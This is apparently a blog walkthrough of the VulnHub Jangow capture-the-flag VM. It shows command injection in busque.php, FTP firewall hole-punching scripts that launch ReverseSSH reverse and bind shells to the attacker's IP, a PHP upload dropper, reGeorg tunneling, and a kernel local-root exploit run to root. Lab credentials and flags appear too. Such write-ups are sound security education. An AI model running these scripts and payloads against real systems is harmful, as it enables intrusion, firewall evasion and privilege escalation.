# VulnHub Jangow CTF walkthrough

You drag your coffin around
---------------------------

[Jangow](https://www.vulnhub.com/entry/jangow-101,754/) was a nice CTF. But maybe it was nice because I added several unnecessary steps to challenge myself even more.  

In this walkthrough I will show the different solutions I found to bypass an egress (but ingress too) rule.  

Let's go!  

```plain
Nmap scan report for 192.168.56.118
Host is up (0.00020s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
```

As you can see all ports are filtered except FTP and HTTP.  

The vsFTPd version is not known to be vulnerable. It isn't the backdoored version neither.  

On the web server the directory listing is enabled and there is only one folder called *site*.  

Let's launch [Wapiti](https://github.com/wapiti-scanner/wapiti) on it:  

```plain
[*] Lancement du module exec
---
Exécution de commande dans http://192.168.56.118/site/busque.php via une injection dans le paramètre buscar
Evil request:
    GET /site/busque.php?buscar=a%3Benv%3B HTTP/1.1
    Host: 192.168.56.118
---
```

There is a command injection vulnerability in this *busque.php* script.  

Maybe you should not say *injection* here because you can directly pass commands without any escape character.  

While trying to get a reverse shell it is obvious that some egress filtering is in place.  

Netcat is installed on the box so I can portscan my box with the following command launched from the web script :  

```bash
nc -zvn -w1 192.168.56.1 1-500
```

Listening on the interface with *tshark* I eventually get a connection attempt on port 443 :  

```plain
1 0.000000000 192.168.56.118 → 192.168.56.1 TCP 74 42128 → 443 [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=15199363 TSecr=0 WS=128
2 0.000075280 192.168.56.1 → 192.168.56.118 TCP 54 443 → 42128 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```

But FTP is running on the VM and this protocol is well known for punching holes in firewalls so let's figure out how we can do this !  

First we need credentials for FTP because anonymous connection aren't allowed.  

In */var/www/html/site/wordpress/config.php* I can find the following creds :  

```php
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
```

Unfortunately they don't work for FTP but after some time I found a hidden file on the system : */var/www/html/.backup*  

```php
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
```

Those are valid credentials for FTP. When I connect the working directory is */var/www/html/site/* but I can *cd ..* to the root. The only restriction is that I'm a simple user.  

In */home/jangow01* there is the *user.txt* flag with content *d41d8cd98f00b204e9800998ecf8427e*.  

Alternative upload solution
---------------------------

With FTP I can upload useful scripts like LinPEAS but I could have instead wrote a PHP upload script on the system by executing a command like :  

```bash
echo base64_encoded_php_script | base64 -d > /var/www/html/site/upl.php
```

That upload script would have been the following :  

```php
<?php
if(!empty($_FILES['uploaded_file']))
{
    $path = "/tmp/" . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "uploaded";
    } else{
        echo "error";
    }
}
?>
```

Then I would have used cURL to upload my files :  

```bash
curl -F 'uploaded_file=@linpeas.sh' http://192.168.56.118/site/upl.php
```

This is something I already use to solve [Reddish from HackTheBox](http://devloop.users.sourceforge.net/index.php?article189/solution-du-ctf-reddish-de-hackthebox).  

Hole punching with FTP (egress)
-------------------------------

You certainly know already that FTP has two communications modes : passive and active.  

FTP is a special protocol because it needs to open another communication channel to transfer data.  

In passive mode the FTP server tells the client on which port (on the server) it should connect to fetch the data.  

In active mode the client is giving the server the port it must connect to (the server connect back to us).  

This is a pain for firewalls that must monitor the FTP trafic on port 21, catch those ports related commands and dynamically open the required port temporarily.  

Let's start with active mode. I wrote a simple Python script to activate the active mode (passive mode set to *False*) and fetch some data (a directory listing) :  

```python
from ftplib import FTP

ftp = FTP("192.168.56.118", "jangow01", "abygurl69")
ftp.set_pasv(False)
print(ftp.retrlines('LIST'))
ftp.close()
```

The communication looks like this, starting with the server sending us his banner :  

```plain
< 220 (vsFTPd 3.0.3)
> USER jangow01
< 331 Please specify the password.
> PASS abygurl69
< 230 Login successful.
> TYPE A
< 200 Switching to ASCII mode.
> PORT 192,168,56,1,157,99
< 200 PORT command successful. Consider using PASV.
> LIST
< 150 Here comes the directory listing.
< 226 Directory send OK.
```

The important part is the *PORT* command where we are asking the server to connect to our IP address on port 40291 (it appears as *157,99* in FTP).  

But the server doesn't connect immediatly to this port. In fact it occurs when we emmit the *LIST* command :  

```plain
< drwxr-xr-x    3 0        0            4096 Oct 31 19:36 html
```

It means that the firewall adds a temporarily egress rule when it sees the *PORT* command but if we don't send the *LIST* command then the FTP server won't use that channel, leaving enough time for another program to use it and that program will be our backdoor :)  

First let's launch the fabulous [ReverseSSH](https://github.com/Fahrj/reverse-ssh) in listening mode :  

```bash
$ ./reverse-sshx64 -v -l -p 2222
```

Then let's use this home made script to punch the hole and launch the connect back on the server :  

```python
from ftplib import FTP
from urllib.request import urlopen
from urllib.parse import quote

LHOST = "192.168.56.1"
LPORT = 2222

RHOST = "192.168.56.118"

REVERSE_SHELL = f"/home/jangow01/reverse-sshx64 -v -p {LPORT} {LHOST} &"

ftp = FTP(RHOST, "jangow01", "abygurl69")
ftp.set_pasv(False)
ftp.sendport(LHOST, LPORT)  # punch that hole
# Get us a shell
urlopen(f"http://{RHOST}/site/busque.php?buscar={quote(REVERSE_SHELL)}")
ftp.close()
```

Once the ReverseSSH tunnel is established, just connect to it and voilà :  

```bash
$ ssh -p 8888 127.0.0.1
```

Thanks to the TTY we can *su* to the user *jangow01* using the password *abygurl69* :  

```plain
www-data@jangow01:/var/www/html/site$ su jangow01
Password: 
jangow01@jangow01:/var/www/html/site$ id
uid=1000(jangow01) gid=1000(desafio02) grupos=1000(desafio02)
```

Hole punching with FTP (ingress)
--------------------------------

This was even easier. Here we are using passive mode. We don't have control on which port will be chosen by the server though. We just need to catch the port number, launch the backdoor on the target in background (I'm using *screen* in detached mode here) then connect to this port to get out shell :-)  

```python
import os                                                                                                              
from time import sleep                                                                                                 
from ftplib import FTP                                                                                                 
from urllib.request import urlopen                                                                                     
from urllib.parse import quote                                                                                         

RHOST = "192.168.56.118"                                                                                               

ftp = FTP(RHOST, "jangow01", "abygurl69")                                                                              
ftp.set_pasv(True)                                                                                                     
__, port = ftp.makepasv()                                                                                              
ftp.close()                                                                                                            
print(f"Punching hole on port {port}")                                                                                 
BIND_SHELL = f"screen -dm bash -c '/home/jangow01/reverse-sshx64 -v -l -p {port}'"                                     
url = f"http://{RHOST}/site/busque.php?buscar={quote(BIND_SHELL)}"                                                     
urlopen(url)                                                                                                           
sleep(.1)                                                                                                              
print(f"Lauching ssh on {RHOST}:{port}")                                                                               
os.system(f"ssh -p {port} {RHOST}")
```

It works flawlessly !  

Tunneling our shell through the HTTP server
-------------------------------------------

Another solution to get an interactive shell without being annoyed by the firewall rules is to tunnel our shell using the famous [reGeorg](https://github.com/sensepost/reGeorg/).  

The first step is to put [this PHP script](https://github.com/sensepost/reGeorg/blob/master/tunnel.php) on the webserver. As the server is running Linux you must remove the call to the *dl()* function in the code that tries to load a PHP related dll file.  

Then you establish the tunnel like this :  

```plain
$ python2 reGeorgSocksProxy.py -v DEBUG -p 11080 -u http://192.168.56.118/site/tunnel.php

                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad

[INFO   ]  Log Level set to [DEBUG]
[INFO   ]  Starting socks server [127.0.0.1:11080], tunnel at [http://192.168.56.118/site/tunnel.php]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

Third step, you must use [Proxychains-NG](https://github.com/rofl0r/proxychains-ng) with the following line in *proxychains.conf* :  

```plain
socks5 127.0.0.1 11080
```

Finally use SSH with Proxychains to connect to the SSH server (that is listening on the loopback interface on our target) :  

```plain
$ ./proxychains4 -f proxychains.conf ssh jangow01@127.0.0.1
[proxychains] config file found: proxychains.conf
[proxychains] preloading ./libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.15-git-1-g7de7dd0
[proxychains] Strict chain  ...  127.0.0.1:11080  ...  127.0.0.1:22  ...  OK
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:f1otJDbg1iG5fzuvFa+s2ugcUMeDNgzcASJbEKMAp9Y.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

262 pacotes podem ser atualizados.
175 atualizações são atualizações de segurança.

Last login: Sun Oct 31 19:39:50 2021 from 192.168.174.128
jangow01@jangow01:~$ id
uid=1000(jangow01) gid=1000(desafio02) grupos=1000(desafio02)
```

What a great day to be alive :D  

I saw that a fork of *reGeorg* exists and seems to work with Python3 but I didn't test it : [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg/).  

Now it is time for...  

Privilege escalation
--------------------

I discovered a binary called */script/backup* but :  

* setuid bit isn't set
* it has no capabilities
* there are no sudo rules associated with *jangow01*

So even if I find a vulnerability in it, it will get me nowhere :-/  

The binary is not stripped so I can see the functions names. One is called *arc4* and is obviously a reference to the cipher *RC4*.  

I won't go too much in the details. I used [Cutter](https://cutter.re/) to analyze it.  

The program first initialize an array then scramble it using a key that seems to be the file name (*argv[0]*).  

It then use that key to decrypt several strings in memory. I wrote a debugger with the help of a ptrace wrapper found [here](https://github.com/eliben/code-for-blog/tree/master/2011/debuggers_part2_code/x64).  

My code is putting a breakpoint at the end of the *arc4* function to extract the string at the address stored in the RDI register, this way I can extract every decrypted text.  

```c
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <syscall.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <unistd.h>
#include <errno.h>

#include "debuglib.h"

unsigned long get_child_rdi(pid_t pid)
{
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    return regs.rdi;
}

// https://stackoverflow.com/a/10515249
char *read_string (int child, unsigned long addr) {
    char *val = malloc(4096);
    if (!val)
        return NULL;

    int allocated = 4096, read = 0;
    unsigned long tmp =0;
    while(1) {
        if (read + sizeof (tmp) > allocated) {
            allocated *= 2;
            char *temp_val = realloc (val, allocated);
            if (!temp_val) {
                free(val);
                return NULL;
            }
            val = temp_val;
        }
        tmp = ptrace(PTRACE_PEEKDATA, child, addr + read);
        if(errno != 0) {
            val[read] = 0;
            break;
        }
        memcpy(val + read, &tmp, sizeof tmp);
        if (memchr(&tmp, 0, sizeof tmp) != NULL) break;
        read += sizeof tmp;
    }
    return val;
}

void run_debugger(pid_t child_pid, uint64_t addr)
{
    procmsg("debugger started\n");

    /* Wait for child to stop on its first instruction */
    wait(0);
    procmsg("child now at EIP = %p\n", get_child_eip(child_pid));

    /* Create breakpoint and run to it*/
    debug_breakpoint* bp = create_breakpoint(child_pid, (void*) addr);
    procmsg("breakpoint created\n");
    ptrace(PTRACE_CONT, child_pid, 0, 0);
    wait(0);

    /* Loop as long as the child didn't exit */
    while (1) {
        /* The child is stopped at a breakpoint here. Resume its
        ** execution until it either exits or hits the
        ** breakpoint again.
        */
        unsigned long rdi = get_child_rdi(child_pid);
        char * decrypted = read_string(child_pid, rdi);
        procmsg("RDI = %p, string is:\n---\n%s\n---\n", rdi, decrypted);
        free(decrypted);
        procmsg("resuming\n");
        int rc = resume_from_breakpoint(child_pid, bp);

        if (rc == 0) {
            procmsg("child exited\n");
            break;
        }
        else if (rc == 1) {
            continue;
        }
        else {
            procmsg("unexpected: %d\n", rc);
            break;
        }
    }

    cleanup_breakpoint(bp);
}

int main(int argc, char** argv)
{
    pid_t child_pid;

    child_pid = fork();
    if (child_pid == 0)
        run_target("/tmp/jail/backup");
    else if (child_pid > 0) {
        uint64_t addr = (uint64_t) 0x00400dda;
        run_debugger(child_pid, addr);
    } else {
        perror("fork");
        return -1;
    }

    return 0;
}

```

Unfortunately nothing interesting was extracted :  

```plain
[24150] debugger started
[24151] target started. will run '/tmp/jail/backup'
[24150] child now at EIP = 0x7f6b820e5090
[24150] breakpoint created
[24150] RDI = 0x6022f8, string is:
---
has expired!
Please contact your provider
---
[24150] resuming
[24150] RDI = 0x60214f, string is:
---

---
[24150] resuming
[24150] RDI = 0x60232a, string is:
---
/bin/bash
---
[24150] resuming
[24150] RDI = 0x6020e0, string is:
---
-c
---
[24150] resuming
[24150] RDI = 0x6020e4, string is:
---
exec '%s' "$@"
---
[24150] resuming
[24150] RDI = 0x6020f5, string is:
---

---
[24150] resuming
[24150] RDI = 0x6020fa, string is:
---
location has changed!
---
[24150] resuming
[24150] RDI = 0x602168, string is:
---
location has changed!
---
[24150] resuming
[24150] RDI = 0x6022da, string is:
---
abnormal behavior!
---
[24150] resuming
[24150] RDI = (nil), string is:
---

---
[24150] resuming
```

So, like everybody did, I searched for possible local exploits :  

```plain
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

I used [the first in the list](https://www.exploit-db.com/exploits/45010) :  

```plain
jangow01@jangow01:~$ gcc -o cve-2017-16995 cve-2017-16995.c
jangow01@jangow01:~$ ./cve-2017-16995 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003c3d5300
[*] Leaking sock struct from ffff8800374b0000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880038116cc0
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880038116cc0
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) grupos=0(root),1000(desafio02)
# cd /root
# ls
proof.txt
# cat proof.txt 
                       @@@&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@&&&&&&&&&&&&&&                          
                       @  @@@@@@@@@@@@@@@&#   #@@@@@@@@&(.    /&@@@@@@@@@@                          
                       @  @@@@@@@@@@&( .@@@@@@@@&%####((//#&@@@&   .&@@@@@                          
                       @  @@@@@@@&  @@@@@@&@@@@@&%######%&@*   ./@@*   &@@                          
                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&.   &@@@&&                    
                       @  @@@, /@@@@@@@@#,                       .@.  ,&,   @@&&                    
                       @  @&  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&                    
                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                   
                       @@&  @@@@@@@@*          @@@@@@@@@@@             ,        @                   
                       @&  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &@                  
                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 
                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 
                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 
                       @&   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  
                       @@    ,@@@@@@@@,   @@@@@@@@@&*%@@@@@@@@@,    @@@@@(%&*   &@                  
                       @@&     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &@                   
                       @ @&     ,@@@@@@@@@@@@@@@,@@@@@@@&%@@@@@@@@@@@@@@@%*   &@                    
                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &@&                    
                       @  @@@&       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &@@&&                    
                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&#/.      &@@@@&&                    
                       @  @@@@@@@@&               JANGOW               &@@@                          
                       @  &&&&&&&&&@@@&     @@(&@ @. %.@ @@%@     &@@@&&&&                          
                                     &&&@@@@&%       &/    (&&@@@&&&                                
                                       (((((((((((((((((((((((((((((

da39a3ee5e6b4b0d3255bfef95601890afd80709

# ufw status
Estado: ativo

Para                       Ação        De
----                       ----        --
21/tcp                     ALLOW       Anywhere                  
80                         ALLOW       Anywhere                  

443                        ALLOW OUT   Anywhere
```

Done ! I had some fun time with the firewall rules but I'm disappointed that the binary seems to lead to nowhere.  


*Published January 09 2022 at 14:27*